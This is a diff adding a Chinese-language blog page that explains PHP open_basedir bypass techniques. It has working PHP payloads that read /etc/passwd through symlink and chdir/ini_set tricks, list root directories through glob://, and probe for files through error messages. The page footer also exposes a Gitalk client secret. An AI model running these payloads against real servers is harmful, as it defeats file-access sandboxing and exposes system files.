@@ -1,0 +1,295 @@
+<!DOCTYPE html>
+<html>
+
+<head><meta name="generator" content="Hexo 3.9.0">
+  
+  <title>Bypass_open_basedir - MINX&#39;s Blog</title>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  
+  
+
+  <link rel="shortcut icon" href="https://iminx.oss-cn-beijing.aliyuncs.com/%E5%B0%81%E9%9D%A2/head.png" type="image/png">
+  <meta name="description" content="open_basedir是php.ini中的一个配置选项，可用于将用户访问文件的活动范围限制在指定的区域。假设open_basedir=/var/www/html/web1/:/tmp/，那么通过web1访问服务器的用户就无法获取服务器上除了/var/www/html/web1/和/tmp/这两个目录以外的文件。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Bypass_open_basedir">
+<meta property="og:url" content="http://iminx.cn/2019/09/10/Bypass-open-basedir/index.html">
+<meta property="og:site_name" content="MINX&#39;s Blog">
+<meta property="og:description" content="open_basedir是php.ini中的一个配置选项，可用于将用户访问文件的活动范围限制在指定的区域。假设open_basedir=/var/www/html/web1/:/tmp/，那么通过web1访问服务器的用户就无法获取服务器上除了/var/www/html/web1/和/tmp/这两个目录以外的文件。">
+<meta property="og:locale" content="zh-CN">
+<meta property="og:image" content="https://i.loli.net/2019/09/09/rSloTZGsadJyDu6.png">
+<meta property="og:image" content="https://i.loli.net/2019/09/09/EvS9ocyKgP8DbNi.png">
+<meta property="og:image" content="https://i.loli.net/2019/09/09/lBz6PtU8GadZwLe.png">
+<meta property="og:image" content="https://i.loli.net/2019/09/09/kZystVrMCLqKj2J.png">
+<meta property="og:updated_time" content="2019-09-10T09:10:41.609Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="Bypass_open_basedir">
+<meta name="twitter:description" content="open_basedir是php.ini中的一个配置选项，可用于将用户访问文件的活动范围限制在指定的区域。假设open_basedir=/var/www/html/web1/:/tmp/，那么通过web1访问服务器的用户就无法获取服务器上除了/var/www/html/web1/和/tmp/这两个目录以外的文件。">
+<meta name="twitter:image" content="https://i.loli.net/2019/09/09/rSloTZGsadJyDu6.png">
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/mdui@0.4.3/dist/css/mdui.min.css">
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@9.15.8/styles/atom-one-dark.css">
+   
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css">
+  
+  <link rel="stylesheet" href="//at.alicdn.com/t/font_1038733_0xvrvpg9c0r.css">
+  <link rel="stylesheet" href="/css/style.css?v=1568106720285">
+</head>
+
+<body class="mdui-drawer-body-left">
+  
+  <div class="nexmoe-bg" style="background-image: url(https://iminx.oss-cn-beijing.aliyuncs.com/%E5%B0%81%E9%9D%A2/4.jpg)"></div>
+  <div id="nexmoe-header">
+      <div class="nexmoe-drawer mdui-drawer" id="drawer">
+    <div class="nexmoe-avatar mdui-ripple">
+        <a href="/">
+            <img src="https://iminx.oss-cn-beijing.aliyuncs.com/%E5%B0%81%E9%9D%A2/head.png">
+        </a>
+    </div>
+    <div class="nexmoe-count">
+        <div><span>文章</span>4</div>
+        <div><span>标签</span>0</div>
+        <div><span>分类</span>0</div>
+    </div>
+    <ul class="nexmoe-list mdui-list" mdui-collapse="{accordion: true}">
+        
+        <a class="nexmoe-list-item mdui-list-item mdui-ripple" href="/">
+            <i class="mdui-list-item-icon nexmoefont icon-home"></i>
+            <div class="mdui-list-item-content">
+                回到首页
+            </div>
+        </a>
+        
+    </ul>
+    <aside id="nexmoe-sidebar">
+  
+  <div class="nexmoe-widget-wrap">
+    <h3 class="nexmoe-widget-title">社交按钮</h3>
+    <div class="nexmoe-widget nexmoe-social">
+        <a class="mdui-ripple" href="https://github.com/clhclh1/clhclh1.github.io" target="_blank" mdui-tooltip="{content: 'GitHub'}" style="color: rgb(25, 23, 23);background-color: rgba(25, 23, 23, .15);">
+            <i class="nexmoefont icon-github"></i>
+        </a>
+    </div>
+</div>
+  
+  
+
+  
+  
+  
+  
+  <div class="nexmoe-widget-wrap">
+    <h3 class="nexmoe-widget-title">文章归档</h3>
+    <div class="nexmoe-widget">
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/09/">九月 2019</a></li></ul>
+    </div>
+  </div>
+
+
+  
+</aside>
+    <div class="nexmoe-copyright">
+        &copy; 2019 MINX
+        Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
+        & <a href="https://nexmoe.com/hexo-theme-nexmoe.html" target="_blank">Nexmoe</a>
+    </div>
+</div><!-- .nexmoe-drawer -->
+
+<script>
+    const getRealPath = (pathname, desc = false) => {
+        if (!pathname) {
+            pathname = window.location.pathname
+        }
+        let names = pathname.split("/")
+        if (desc === false) {
+            for (let i = names.length - 1; i >= 0; --i) {
+                let name = names[i].trim()
+                if (name.length > 0 && name !== "/" && name !== "index.html") {
+                    return name
+                }
+            }
+        } else {
+            for (let i = 0; i < names.length; ++i) {
+                let name = names[i].trim()
+                if (name.length > 0 && name !== "/" && name !== "index.html") {
+                    return name
+                }
+            }
+        }
+        return "/"
+    }
+    let links = document.querySelectorAll('.nexmoe-list-item');
+    let rootRealPath = getRealPath(window.location.pathname, true);
+    for (let link of links) {
+        let linkPath = link.getAttribute("href");
+        if (linkPath && getRealPath(linkPath, true) === rootRealPath) {
+            link.className = "active nexmoe-list-item mdui-list-item mdui-ripple";
+        }
+    }
+</script>
+  </div>
+  <div id="nexmoe-content">
+    <div class="nexmoe-primary">
+        <div class="nexmoe-tab">
+            <a mdui-drawer="{target: '#drawer', swipe: true}">
+              <i class="mdui-icon material-icons">menu</i>
+            </a>
+          </div>
+        <div class="nexmoe-post">
+    <div class="nexmoe-post-cover"> 
+        
+        <img src="https://iminx.oss-cn-beijing.aliyuncs.com/%E5%B0%81%E9%9D%A2/3.jpg">
+        
+        <h1>Bypass_open_basedir</h1>
+    </div>
+  <div class="nexmoe-post-meta">
+    <a><i class="nexmoefont icon-calendar-fill"></i>2019年09月10日</a>
+    <a><i class="nexmoefont icon-areachart"></i>1,521 字</a>
+    <a><i class="nexmoefont icon-time-circle-fill"></i>大概 6 分钟</a>
+    
+    
+  </div>
+  <article>
+    <p>open_basedir是php.ini中的一个配置选项，可用于将用户访问文件的活动范围限制在指定的区域。假设open_basedir=/var/www/html/web1/:/tmp/，那么通过web1访问服务器的用户就无法获取服务器上除了/var/www/html/web1/和/tmp/这两个目录以外的文件。</p>
+<a id="more"></a>
+<p><strong>注意：用open_basedir指定的限制实际上是前缀，而不是目录名。</strong></p>
+<p>参考：<a href="https://www.mi1k7ea.com/2019/07/20/%E6%B5%85%E8%B0%88%E5%87%A0%E7%A7%8DBypass-open-basedir%E7%9A%84%E6%96%B9%E6%B3%95/" target="_blank" rel="noopener">https://www.mi1k7ea.com/2019/07/20/%E6%B5%85%E8%B0%88%E5%87%A0%E7%A7%8DBypass-open-basedir%E7%9A%84%E6%96%B9%E6%B3%95/</a></p>
+<h2 id="利用命令执行函数Bypass"><a href="#利用命令执行函数Bypass" class="headerlink" title="利用命令执行函数Bypass"></a>利用命令执行函数Bypass</h2><p>open——basedir对命令执行行数没有限制，因此可以通过system()等函数来cat文件</p>
+<pre><code>&lt;?php
+//echo file_get_contents(&#39;/home/1.txt&#39;);
+show_source(__FILE__);
+system(&#39;cat /home/1.txt&#39;);
+?&gt;</code></pre><p>但是呢，一般情况下这一类函数会被disable_functions禁用，因此使用场景十分的局限</p>
+<h2 id="利用syslink-函数Bypass"><a href="#利用syslink-函数Bypass" class="headerlink" title="利用syslink()函数Bypass"></a>利用syslink()函数Bypass</h2><h4 id="symlink函数（PHP4-5-7）"><a href="#symlink函数（PHP4-5-7）" class="headerlink" title="symlink函数（PHP4/5/7）"></a>symlink函数（PHP4/5/7）</h4><p>symlink()函数创建一个从指定名称连接的现存目标文件开始的符号连接。如果成功，该函数返回TRUE；如果失败，则返回FALSE。<br><code>symlink ( string $target , string $link ) : bool</code><br>该函数有两个必须参数</p>
+<ol>
+<li>target(连接的目标)</li>
+<li>link(连接的名称)<h4 id="符号连接"><a href="#符号连接" class="headerlink" title="符号连接"></a>符号连接</h4>符号链接又叫软链接，是一类特殊的文件，这个文件包含了另一个文件的路径名(绝对路径或者相对路径)。路径可以是任意文件或目录，可以链接不同文件系统的文件。在对符号文件进行读或写操作的时候，系统会自动把该操作转换为对源文件的操作，但删除链接文件时，系统仅仅删除链接文件，而不删除源文件本身<h4 id="Bypass"><a href="#Bypass" class="headerlink" title="Bypass"></a>Bypass</h4>原理是创建一个链接文件aaa用相对路径指向A/B/C/D，再创建一个链接文件exp指向aaa/../../../../etc/passwd，其实就是指向了A/B/C/D/../../../../etc/passwd，也就是/etc/passwd。这时候删除aaa文件再创建aaa目录但是exp还是指向了aaa也就是A/B/C/D/../../../../etc/passwd，就进入了路径/etc/passwd<br>payload构造的注意点就是：要读的文件需要往前跨多少路径，就得创建多少层的子目录，然后输入多少个../来设置目标文件。<pre><code>&lt;?php
+mkdir(&quot;A&quot;);
+chdir(&quot;A&quot;);
+mkdir(&quot;B&quot;);
+chdir(&quot;B&quot;);
+mkdir(&quot;C&quot;);
+chdir(&quot;C&quot;);
+mkdir(&quot;D&quot;);
+chdir(&quot;D&quot;);
+chdir(&quot;..&quot;);
+chdir(&quot;..&quot;);
+chdir(&quot;..&quot;);
+chdir(&quot;..&quot;);
+symlink(&quot;A/B/C/D&quot;,&quot;aaa&quot;);
+symlink(&quot;aaa/../../../../etc/passwd&quot;,&quot;exp&quot;);
+unlink(&quot;aaa&quot;);
+mkdir(&quot;aaa&quot;);
+?&gt;</code></pre><h2 id="利用glob-伪协议Bypass"><a href="#利用glob-伪协议Bypass" class="headerlink" title="利用glob://伪协议Bypass"></a>利用glob://伪协议Bypass</h2><h4 id="glob-伪协议"><a href="#glob-伪协议" class="headerlink" title="glob://伪协议"></a>glob://伪协议</h4>glob:// — 查找匹配的文件路径模式，是php自5.3.0版本起开始生效的一个用来筛选目录的伪协议，其用法示例如下：<pre><code>&lt;?php
+// 循环 ext/spl/examples/ 目录里所有 *.php 文件
+// 并打印文件名和文件尺寸
+$it = new DirectoryIterator(&quot;glob://ext/spl/examples/*.php&quot;);
+foreach($it as $f) {
+ printf(&quot;%s: %.1FK\n&quot;, $f-&gt;getFilename(), $f-&gt;getSize()/1024);
+}
+?&gt;</code></pre><h4 id="Bypass-1"><a href="#Bypass-1" class="headerlink" title="Bypass"></a>Bypass</h4>单用glob://是没有办法绕过的，要结合其它函数来实现<h5 id="方式1——DirectoryIterator-glob"><a href="#方式1——DirectoryIterator-glob" class="headerlink" title="方式1——DirectoryIterator+glob://"></a>方式1——DirectoryIterator+glob://</h5>DirectoryIterator是php5中增加的一个类，为用户提供一个简单的查看目录的接口。<br>DirectoryIterator与glob://结合将无视open_basedir，列举出根目录下的文件：<pre><code>&lt;?php
+$c = $_GET[&#39;c&#39;];
+$a = new DirectoryIterator($c);
+foreach($a as $f){
+ echo($f-&gt;__toString().&#39;&lt;br&gt;&#39;);
+}
+?&gt;</code></pre>输入glob:///*即可列出根目录下的文件，但是会发现只能列根目录和open_basedir指定的目录的文件<br><img src="https://i.loli.net/2019/09/09/rSloTZGsadJyDu6.png" alt="openbasedir。1、.png"><h5 id="方式2——opendir-readdir-glob"><a href="#方式2——opendir-readdir-glob" class="headerlink" title="方式2——opendir()+readdir()+glob://"></a>方式2——opendir()+readdir()+glob://</h5>opendir()函数为打开目录句柄，readdir()函数为从目录句柄中读取条目。<br>这里结合两个函数来列举根目录中的文件：<pre><code>&lt;?php
+$a = $_GET[&#39;c&#39;];
+if ( $b = opendir($a) ) {
+ while ( ($file = readdir($b)) !== false ) {
+     echo $file.&quot;&lt;br&gt;&quot;;
+ }
+ closedir($b);
+}
+?&gt;</code></pre>效果和方式1是一样的，只能Bypass open_basedir来列举根目录中的文件，不能列举出其他非根目录和open_basedir指定的目录中的文件。<h2 id="利用chdir-与ini-set-组合Bypass"><a href="#利用chdir-与ini-set-组合Bypass" class="headerlink" title="利用chdir()与ini_set()组合Bypass"></a>利用chdir()与ini_set()组合Bypass</h2><h4 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h4>主要原理是利用了open_basedir存在缺陷的处理逻辑<h4 id="Bypass-2"><a href="#Bypass-2" class="headerlink" title="Bypass"></a>Bypass</h4><img src="https://i.loli.net/2019/09/09/EvS9ocyKgP8DbNi.png" alt="chdir.png"><br>首先呢chdir(‘img’)到文件的子目录，这一步是复合open_basedir的检查的，因此当前的目录就是/var/www/html/img，接着ini_set(“open_basedir”,”..”),由于内部函数的一系列漏洞，这一代码是可以通过检查的，此时open_basedir的工作目录是(/var/www/html/img)+..，接下来就是不断地chdir(“..”),最终将open_basedir改到了根目录下，于是乎就失效了。。。<br>这里是一个利用的payload：<pre><code>mkdir(&#39;minx&#39;);
+chdir(&#39;minx&#39;);
+ini_set(&#39;open_basedir&#39;,&#39;..&#39;);
+chdir(&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);
+ini_set(&#39;open_basedir&#39;,&#39;/&#39;);
+echo file_get_contents(&#39;/etc/passwd&#39;);</code></pre><h2 id="利用bindtextdomain-函数Bypass"><a href="#利用bindtextdomain-函数Bypass" class="headerlink" title="利用bindtextdomain()函数Bypass"></a>利用bindtextdomain()函数Bypass</h2><h4 id="原理-1"><a href="#原理-1" class="headerlink" title="原理"></a>原理</h4>bingtextdomain()函数（PHP4/5/7）用于damain到某个目录的函数<h4 id="Bypass-3"><a href="#Bypass-3" class="headerlink" title="Bypass"></a>Bypass</h4>利用的就是基于报错，用来判断文件是否存在<br>payload：<pre><code>&lt;?php
+printf(&#39;&lt;b&gt;open_basedir: %s&lt;/b&gt;&lt;br /&gt;&#39;, ini_get(&#39;open_basedir&#39;));
+$re = bindtextdomain(&#39;xxx&#39;, $_GET[&#39;dir&#39;]);
+var_dump($re);
+?&gt;</code></pre>如果存在文件，将会返回文件的路径<br><img src="https://i.loli.net/2019/09/09/lBz6PtU8GadZwLe.png" alt="bindtextdomain1.png"><br>当然如果文件不存在就会返回false<h2 id="利用SplFileInfo-getRealPath-类方法Bypass"><a href="#利用SplFileInfo-getRealPath-类方法Bypass" class="headerlink" title="利用SplFileInfo::getRealPath()类方法Bypass"></a>利用SplFileInfo::getRealPath()类方法Bypass</h2><h4 id="SplFileInfo类-PHP-5-gt-5-1-2-PHP-7"><a href="#SplFileInfo类-PHP-5-gt-5-1-2-PHP-7" class="headerlink" title="SplFileInfo类(PHP 5 &gt;= 5.1.2, PHP 7)"></a>SplFileInfo类(PHP 5 &gt;= 5.1.2, PHP 7)</h4>SplFileInfo类为单个文件的信息提供高级面向对象的接口。<br>SplFileInfo::getRealPath(PHP 5 &gt;= 5.2.2, PHP 7)<br>SplFileInfo::getRealPath类方法是用于获取文件的绝对路径。<h4 id="Bypass-4"><a href="#Bypass-4" class="headerlink" title="Bypass"></a>Bypass</h4>和上面的bindtextdomain一样，基于报错，payload：<pre><code>&lt;?php
+echo &#39;&lt;b&gt;open_basedir: &#39; . ini_get(&#39;open_basedir&#39;) . &#39;&lt;/b&gt;&lt;br /&gt;&#39;;
+$info = new SplFileInfo($_GET[&#39;dir&#39;]);
+var_dump($info-&gt;getRealPath());
+?&gt;</code></pre><h2 id="利用realpath-函数Bypass"><a href="#利用realpath-函数Bypass" class="headerlink" title="利用realpath()函数Bypass"></a>利用realpath()函数Bypass</h2><h4 id="realpath-函数（PHP4-5-7）"><a href="#realpath-函数（PHP4-5-7）" class="headerlink" title="realpath()函数（PHP4/5/7）"></a>realpath()函数（PHP4/5/7）</h4>realpath — 返回规范化的绝对路径名。它可以去掉多余的../或./等跳转字符，能将相对路径转换成绝对路径。<h4 id="原理-2"><a href="#原理-2" class="headerlink" title="原理"></a>原理</h4>首要环境条件：Windows<br>基本原理是基于报错返回内容的不用，设置自定义的错误处理函数，循环遍历匹配到正则的报错信息的字符来逐个拼接成存在的文件名，另外是需要结合利用Windows下的两个特殊的通配符&lt;和&gt;，不然只能进行暴破。<h4 id="Bypass-5"><a href="#Bypass-5" class="headerlink" title="Bypass"></a>Bypass</h4>payload：<pre><code>&lt;?php
+ini_set(&#39;open_basedir&#39;, dirname(__FILE__));
+printf(&quot;&lt;b&gt;open_basedir: %s&lt;/b&gt;&lt;br /&gt;&quot;, ini_get(&#39;open_basedir&#39;));
+set_error_handler(&#39;isexists&#39;);
+$dir = &#39;E:/wamp64/&#39;;
+$file = &#39;&#39;;
+$chars = &#39;abcdefghijklmnopqrstuvwxyz0123456789_&#39;;
+for ($i=0; $i &lt; strlen($chars); $i++) {
+     $file = $dir . $chars[$i] . &#39;&lt;&gt;&lt;&#39;;
+     realpath($file);
+}
+function isexists($errno, $errstr)
+{
+     $regexp = &#39;/File\((.*)\) is not within/&#39;;
+     preg_match($regexp, $errstr, $matches);
+     if (isset($matches[1])) {
+             printf(&quot;%s &lt;br/&gt;&quot;, $matches[1]);
+     }
+}
+?&gt;</code></pre>可以看到，首字母不同的文件就被列出来了，首字母相同的文件中只列了第一个：<br><img src="https://i.loli.net/2019/09/09/kZystVrMCLqKj2J.png" alt="realpath.png"></li>
+</ol>
+
+  </article>
+  
+    
+<div class="nexmoe-post-copyright">
+<i class="mdui-list-item-icon nexmoefont icon-info-circle"></i>
+<strong>本文作者：</strong>MINX<br>
+<strong>本文链接：</strong><a href="http://iminx.cn/2019/09/10/Bypass-open-basedir/" title="http://iminx.cn/2019/09/10/Bypass-open-basedir/" target="_blank" rel="noopener">http://iminx.cn/2019/09/10/Bypass-open-basedir/</a><br>
+
+  <strong>版权声明：</strong>本文采用 <a href="https://creativecommons.org/licenses/by-nc-sa/3.0/cn/deed.zh" target="_blank">CC BY-NC-SA 3.0 CN</a> 协议进行许可 <br> <a href="http://www.miitbeian.gov.cn/">闽ICP备19007766号</a>
+
+</div>
+
+
+  
+  <section class="nexmoe-comment">
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/gitalk@1.5.0/dist/gitalk.min.css">
+<div id="gitalk"></div>
+<script src="https://cdn.jsdelivr.net/npm/gitalk@1.5.0/dist/gitalk.min.js"></script>
+<script type="text/javascript">
+    var gitalk = new Gitalk({
+        clientID: '80b2453b6d5f37ad6225',
+        clientSecret: '43e99fa852795c9a7b3eb924b2558c64b84bbdeb',
+        id: window.location.pathname,
+        repo: 'nexmoe.github.io',
+        owner: 'nexmoe',
+        admin: 'nexmoe'
+    })
+    gitalk.render('gitalk')
+</script>
+</section>
+</div>
+    </div>
+  </div>
+  <script src="https://cdn.jsdelivr.net/npm/mdui@0.4.3/dist/js/mdui.min.js"></script>
+<script src="https://cdn.jsdelivr.net/npm/jquery@3.4.1/dist/jquery.min.js"></script>
+ 
+    <script src="https://cdn.jsdelivr.net/gh/fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.js"></script>
+
+
+ 
+    <script src="https://cdn.jsdelivr.net/npm/smoothscroll-for-websites@1.4.9/SmoothScroll.min.js"></script>
+
+
+<script src="https://cdn.jsdelivr.net/gh/highlightjs/cdn-release@9.15.8/build/highlight.min.js"></script>
+<script>hljs.initHighlightingOnLoad();</script>
+
+<script src="/js/app.js?v=1568106720271"></script>
+<script src="https://cdn.jsdelivr.net/npm/lazysizes@5.1.0/lazysizes.min.js"></script>
+
+  
+
+
+
+
+
+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/","tagMode":false});</script></body>
+
+</html>
